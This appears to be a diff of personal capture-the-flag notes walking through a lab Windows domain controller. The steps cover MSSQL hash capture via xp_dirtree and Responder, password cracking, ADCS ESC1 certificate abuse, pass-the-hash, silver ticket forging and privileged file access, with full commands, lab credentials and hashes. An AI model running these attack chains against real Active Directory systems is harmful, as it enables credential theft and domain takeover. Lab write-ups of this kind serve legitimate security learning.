@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```bash
 nmap -sV -sC -vv 10.10.11.202
 nmap -sU --top-ports=10 -vv 10.10.11.202
 ---OUTPUT-TCP---
@@ -155,21 +155,21 @@ Host script results:
 53/udp   open          domain       udp-response ttl 127
 123/udp  open          ntp          udp-response ttl 127
 ```
-	- SMB
-	- LDAP
-	- MSSQL (Windows)
-	- Date is 8 hours ahead so any kerberos related required ntp date
-	- Active Directory
+- SMB
+- LDAP
+- MSSQL (Windows)
+- Date is 8 hours ahead so any kerberos related required ntp date
+- Active Directory
 - No directory enumeration as no website
 - **NOTE: Can see certificate at sequel.htbb:3269. The common name is possible the domain name and dc domain name**. 
-	- Can also pass:
-		```bash
+- Can also pass:
+```bash
 openssl s_client -showcerts -connect 10.10.11.202:3269
 openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text | less -S
 ```
 ## SMB Enumeration
 - We pass the command :
-	```bash
+```bash
 smbclient -U '' -L //10.10.11.174
 smbclient //10.10.11.174/Public -N
 > ls
@@ -188,26 +188,26 @@ SYSVOL          Disk      Logon server share
 SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
 ```
 - Can also pass :
-	```bash
+```bash
 crackmapexec smb 10.10.11.202 -u '' -p '' --shares
 ```
-	- On reading this file it talks about a few key things:
-		- Guest SQL Credentials : PublicUser : GuestUserCantWrite1
-		- SQL Management Studio (version 16?)
-			- There is an RCE vulnerability
-				- CVE-2022-29143
-		- Ryan, Tom (maybe admin?)
-		- joining sql from domain and non domain machine
-		- can test with smb
+- On reading this file it talks about a few key things:
+- Guest SQL Credentials : PublicUser : GuestUserCantWrite1
+- SQL Management Studio (version 16?)
+- There is an RCE vulnerability
+- CVE-2022-29143
+- Ryan, Tom (maybe admin?)
+- joining sql from domain and non domain machine
+- can test with smb
 ## Initial Foothold (MSSQL and System)
 - we connect to sql with guest credentials:
-	```bash
+```bash
 impacket-mssqlclient PublicUser:GuestUserCantWrite1@dc.sequel.htb
 > help
 ```
-	- We see some commands we can use (some we are denied permissions).
-		- We start responder on our interface and pass a working command with our local ip and a fake share
-			```bash
+- We see some commands we can use (some we are denied permissions).
+- We start responder on our interface and pass a working command with our local ip and a fake share
+```bash
 ---ON-LOCAL-MACHINE---
 sudo responder -i tun0
 
@@ -217,31 +217,31 @@ xp_dirtree //10.10.14.25/teset/folder # only works with xp_dirtree
 ---OUTPUT-RESPONDER---
 sql_svc::sequel:fceea46898e38734:A0B396EFB00C580AC696687476B8E79A:0101000000000000002D87A939A9DB01EAE711801F3A1E9B0000000002000800540041003200360001001E00570049004E002D004300580050004200450032003600420033005300420004003400570049004E002D00430058005000420045003200360042003300530042002E0054004100320036002E004C004F00430041004C000300140054004100320036002E004C004F00430041004C000500140054004100320036002E004C004F00430041004C0007000800002D87A939A9DB010600040002000000080030003000000000000000000000000030000050A166CB8F8ED0D4CCAF726A2D7D7D5BBD25AA4F88651AB163D4F69E37D6FAB70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320035000000000000000000
 ```
-			- Why xp_dirtree ?
-				-  it specifically triggers a UNC path access, which causes SQL Server to authenticate to your attacker machine.
+- Why xp_dirtree ?
+-  it specifically triggers a UNC path access, which causes SQL Server to authenticate to your attacker machine.
 - We crack the hash
-	```bash
+```bash
 vi sql_svc.hash # copy output above
 john sql_svc.hash --wordlist=/user/share/wordlists/rockyou.txt
 
 ---OUTPUT---
 REGGIE1234ronnie (sql_svc)
 ```
-	- Could test if we can execute commands with crackmapexec -x flag
-		```bash
+- Could test if we can execute commands with crackmapexec -x flag
+```bash
 crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --shares -x "ping 10.10.14.25"
 
 ---ON-LOCAL-MACHINE---
 sudo tcpdump -i tun0 icmp -n
 ```
-		- Doesn't work
+- Doesn't work
 - Winrim into it:
-	```bash
+```bash
 evil-winrm -u sql_svc -p REGGIE1234ronnie -i sequel.htb
 ```
-	- Looking around se find SQLServer in C:\
-	- I downloaded everything but we can move to logs and read logs directly
-		```bash
+- Looking around se find SQLServer in C:\
+- I downloaded everything but we can move to logs and read logs directly
+```bash
 cd C:\SQLServer
 
 download *
@@ -253,18 +253,18 @@ type ERRORLOG.BAK
 2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
 2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
 ```
-		- Looks like user entered their password in user field by mistake
+- Looks like user entered their password in user field by mistake
 - We login as Ryan.Cooper using evil-winrm
-	```bash
+```bash
 evil-winrm -u Ryan.Cooper -p NuclearMosquito3 -i 10.10.11.202
 ```
 ## Privilege Escalation
 ### Method 1a (Certify + Rubeus)
 - In our Nmap scan there were a lot of certiicate outputs.
-	- So let's check if there's a vulnerability there.
-	- We use certify from :
-		- https://github.com/Flangvik/SharpCollection
-		```bash
+- So let's check if there's a vulnerability there.
+- We use certify from :
+- https://github.com/Flangvik/SharpCollection
+```bash
 sudo cp /opt/SharpCollection/NetFramework_4.7_Any/Certify.exe .
 
 ---ON-TARGET-MACHINE---
@@ -303,22 +303,22 @@ upload Certify.exe
                                       sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
 
 ```
-	- User Authentication is vulnerable
-		- Probably due to sequel\Domain Users group rights
-			- We can check Ryan.Cooper's group
-				```bash
+- User Authentication is vulnerable
+- Probably due to sequel\Domain Users group rights
+- We can check Ryan.Cooper's group
+```bash
 net user
 net user ryan.cooper
 
 ---OUTPUT---
 Global Group memberships     *Domain Users
 ```
-				- We also see user Administrator
-	- `In particular we can see that Authenticated Users can enroll for this template and since the msPKI-Certificate-Name-Flag is present and contains ENROLLEE_SUPPLIES_OBJECT the template is vulnerable to the ESC1 scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Administrator by exploiting this attack path.`
+- We also see user Administrator
+- `In particular we can see that Authenticated Users can enroll for this template and since the msPKI-Certificate-Name-Flag is present and contains ENROLLEE_SUPPLIES_OBJECT the template is vulnerable to the ESC1 scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Administrator by exploiting this attack path.`
 - In the certify github page it talks of 3 scenario's, with the third one being our case.
-	- We exploit this command with our creds:
-		- Basically requesting ticket for our user but saying we are admin
-		```bash
+- We exploit this command with our creds:
+- Basically requesting ticket for our user but saying we are admin
+```bash
 .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 
 ---CERTIFICATE-OUTPUT---
@@ -388,23 +388,23 @@ BGXKBgeNyoyxoMhhVQtX51opOsf//g==
 
 [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
-	- to check file command on the pfx file should be data
-	- We also save the certificate and key to seperate files 
-		- key.cert
-		- key.pem
-	- Then we try to login with winrm and these certs:
-		```bash
+- to check file command on the pfx file should be data
+- We also save the certificate and key to seperate files 
+- key.cert
+- key.pem
+- Then we try to login with winrm and these certs:
+```bash
 evil-winrm -S -c key.cert -k key.pem 0i sequel.htb
 ```
-		- Doesn't work. We can check port 5986 (used for ssl certificate)
-			- maybe we use psexec? (didn't try)
-			```bash
+- Doesn't work. We can check port 5986 (used for ssl certificate)
+- maybe we use psexec? (didn't try)
+```bash
 nc -zv 10.10.11.202 5986 # no response
 netstat -an | findstr 5986 # no response
 ```
-			- Not listening on 5986 so cannot winrm over ssl
+- Not listening on 5986 so cannot winrm over ssl
 - We upload Rubeus to target to do it locally (via evil-winrm):
-	```bash
+```bash
 upload www/Rubeus.exe
 upload cert.pfx
 ```
@@ -435,7 +435,7 @@ upload cert.pfx
       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
 ```
 - Get NTLM Hash:
-	```bash
+```bash
 .\Rubeus.exe asktgt /user:Administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
 
 
@@ -484,12 +484,12 @@ upload cert.pfx
 ```
 ### Method 1b (Certipy, through our Kali only)
 - Alternate method: using certipy
-	- https://github.com/ly4k/Certipy
-		```bash
+- https://github.com/ly4k/Certipy
+```bash
 pipx install certipy-ad
 ```
-	- Find vulnerable template using certipy:
-		```bash
+- Find vulnerable template using certipy:
+```bash
 certipy find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable
 
 ---OUTPUT---
@@ -502,8 +502,8 @@ Certificate Templates
     Certificate Authorities             : sequel-DC-CA
     Enabled                             : True
 ```
-	- Get the psx file:
-		```bash
+- Get the psx file:
+```bash
 certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-DC-CA -template UserAuthentication
 
 # Didn't work first time so I passed
@@ -519,8 +519,8 @@ certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@seq
 [*] Certificate has no object SID
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
-	- Get hash:
-		```bash
+- Get hash:
+```bash
 certipy auth -pfc administrator.pfc
 
 ---OUTPUT-FAIL---
@@ -528,14 +528,14 @@ certipy auth -pfc administrator.pfc
 [*] Trying to get TGT...
 [-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
-		- It doesn't work. If we remember in our nmap, we found there was a time skew of about 8 hours  between our target machine and ours.
-			- So we need to sync the times (we use ntpdate):
-				```bash
+- It doesn't work. If we remember in our nmap, we found there was a time skew of about 8 hours  between our target machine and ours.
+- So we need to sync the times (we use ntpdate):
+```bash
 sudo apt install ntpdate
 sudo ntpdate 10.10.11.202
 ```
-	- We pass our command again, with the time synced:
-		```bash
+- We pass our command again, with the time synced:
+```bash
 certipy auth -pfc administrator.pfc
 
 ---OUTPUT---
@@ -548,10 +548,10 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
-		- We get the hash : `a52f78e4c751e5f5e17e1e9f3e58f4ee`
-			- First part before the : is LM hash which is not used
+- We get the hash : `a52f78e4c751e5f5e17e1e9f3e58f4ee`
+- First part before the : is LM hash which is not used
 - Evil winrm with pass-the-hash technique
-	```bash
+```bash
 ---test---
 crackmapexec smb 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
 
@@ -565,17 +565,17 @@ evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
 ### Method 2 (Silver Ticket Attack, harder)
 - Basic Kerberos ticket functioning:
 	![[Pasted image 20250409215217.png]]
-	- As we can see most communication is between client and DC, only authentication with server. The server never really communicates with DC for this.
-	- Basically we request a TGT from DC. DC signs it and gives TGT (encrypted with KRBTGT of the domain) to client. 
-		- The clients don't know this KRBTGT hash so they can't use this ticket as it's signed with a secret they don't know
-			- Can only use it with DC as it has the secrets.
-	- So we give DC the TGT (TG Request) and it sends back a TGS Ticket saying we can talk to it.
-		- We say we wanna talk to MSSQL
-		- DC looks at the TGT and says yes we can (forged? golden ticket)
-	- When DC gives the TGS ticket back, it will encrypt it with the password hash that MSSQL is using.
-		- If not a service, it will use the machine accounts password hash with changes every 30 days.
-			- this is the secret that protects all of kerberos
-	- So when MSSQL gets this, it implicitly trusts it as it thinks we have no way to know what this signing key for this ticket is, so it must've come from the domain controller.
+- As we can see most communication is between client and DC, only authentication with server. The server never really communicates with DC for this.
+- Basically we request a TGT from DC. DC signs it and gives TGT (encrypted with KRBTGT of the domain) to client. 
+- The clients don't know this KRBTGT hash so they can't use this ticket as it's signed with a secret they don't know
+- Can only use it with DC as it has the secrets.
+- So we give DC the TGT (TG Request) and it sends back a TGS Ticket saying we can talk to it.
+- We say we wanna talk to MSSQL
+- DC looks at the TGT and says yes we can (forged? golden ticket)
+- When DC gives the TGS ticket back, it will encrypt it with the password hash that MSSQL is using.
+- If not a service, it will use the machine accounts password hash with changes every 30 days.
+- this is the secret that protects all of kerberos
+- So when MSSQL gets this, it implicitly trusts it as it thinks we have no way to know what this signing key for this ticket is, so it must've come from the domain controller.
 - In context of our attack, we need to get the following (NTLM and Domain SID steps after table)
 
 | Type       | Content                                   |
@@ -586,7 +586,7 @@ evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE
 | Domain SID | S-1-5-21-4078382237-1492182817-2568127209 |
 
 - We generate NTLM hash from our sql_svc MSSQL credentials
-	```bash
+```bash
 python
 
 Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
@@ -600,17 +600,17 @@ b'\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf'
 '1443ec19da4dac4ffc953bca1b57b4cf'
 >>> 
 ```
-	- NTLM is MD4 so we just need to encode it in UTF-16LE for windows
+- NTLM is MD4 so we just need to encode it in UTF-16LE for windows
 - Find SID:
-	- Powershell into the machine (evil-winrm) and:
-		```powershell
+- Powershell into the machine (evil-winrm) and:
+```powershell
 get-addomain
 
 ---OUTPUT---
 DomainSID                          : S-1-5-21-4078382237-1492182817-2568127209
 ```
 - Pass exploit using ticketer:
-	```bash
+```bash
 impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn rocknrj/dc.sequel.htb administrator
 
 ---OUTPUT---
@@ -637,9 +637,9 @@ impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-
 [*]     EncTGSRepPart
 [*] Saving ticket in administrator.ccache
 ```
-	- I tried dc.sequel.htb and just sequel.htb and both worked (both are in my /etc/hosts)
+- I tried dc.sequel.htb and just sequel.htb and both worked (both are in my /etc/hosts)
 - Gain Admin privilege in MSSQL:
-	```bash
+```bash
 KRB5CCNAME=administrator.ccache impacket-mssqlclient -k -nopass administrator@dc.sequel.htb
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -654,19 +654,19 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [!] Press help for extra shell commands
 SQL (sequel\Administrator  dbo@master)>
 ```
-	- Try to execute xp_cmdshell to gain root shell access:
-		```bash
+- Try to execute xp_cmdshell to gain root shell access:
+```bash
 SQL (sequel\Administrator  dbo@master)> xp_cmdshell
 
 ---OUTPUT---
 ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
 ```
-		- xp_cmdshell isprobably running create process and doesn't have the impersonation flag or because our account doesn't have impersonation privileges, it fails to switch to our admin user.
-			- But if we don't use create processes but just make underlying file system calls, it should allow us to act as the user we want.
+- xp_cmdshell isprobably running create process and doesn't have the impersonation flag or because our account doesn't have impersonation privileges, it fails to switch to our admin user.
+- But if we don't use create processes but just make underlying file system calls, it should allow us to act as the user we want.
 - On searching online I find :
-	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#xp_cmdshell
-		- Under MSSQL File Manipulation we pass the command to try and read root file:
-			```bash
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#xp_cmdshell
+- Under MSSQL File Manipulation we pass the command to try and read root file:
+```bash
 > select x from OpenRowset(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) R(x)
 
 
@@ -676,19 +676,19 @@ x
 b'8f3e86a83252edf71aec0e895dc64bf5\r\n'
 ```
 - Note since we said earlier about how if we make underlying file system calls, it should allow us to act as the user we want, we can also try writing if we want and use that as an entry point.
-	- Can check PayloadsAllTheThings > EoP Privileged File Write
-		- can see if any unpatched stuff is there to exploit
-	- https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql
-		- We try to execute this (has to be in two line so can't copy and paste the whole thing.)
-			```sql
+- Can check PayloadsAllTheThings > EoP Privileged File Write
+- can see if any unpatched stuff is there to exploit
+- https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql
+- We try to execute this (has to be in two line so can't copy and paste the whole thing.)
+```sql
 
 create table #errortable (ignore int)
 bulk insert #errortable from '\\localhost\c$\windows\win.ini' with ( fieldterminator=',', rowterminator='\n', errorfile='c:\windows\temp\thatjusthappend.txt')
 drop table #errortable
 ```
-			- Better to avoid temp folder as it may not exist
-		- On checking the temp folder we find the file:
-			```bash
+- Better to avoid temp folder as it may not exist
+- On checking the temp folder we find the file:
+```bash
 cd \Windows\Temp
 dir
 
@@ -696,8 +696,8 @@ dir
 -a----         4/9/2025   7:39 PM             92 thatjusthappend.txt
 -a----         4/9/2025   7:39 PM            439 thatjusthappend.txt.Error.Txt
 ```
-			- Check the owner:
-				```bash
+- Check the owner:
+```bash
 get-acl thatjusthappend.txt
 
 ---OUTPUT---
@@ -708,7 +708,7 @@ Path                Owner                  Access
 ----                -----                  ------
 thatjusthappend.txt BUILTIN\Administrators BUILTIN\Administrators Allow  FullControl...
 ```
-				- So we do have an elevated file write with this server ticket
-					- can find a way to escalate privileges like this if we want.
+- So we do have an elevated file write with this server ticket
+- can find a way to escalate privileges like this if we want.
 ------
 ------
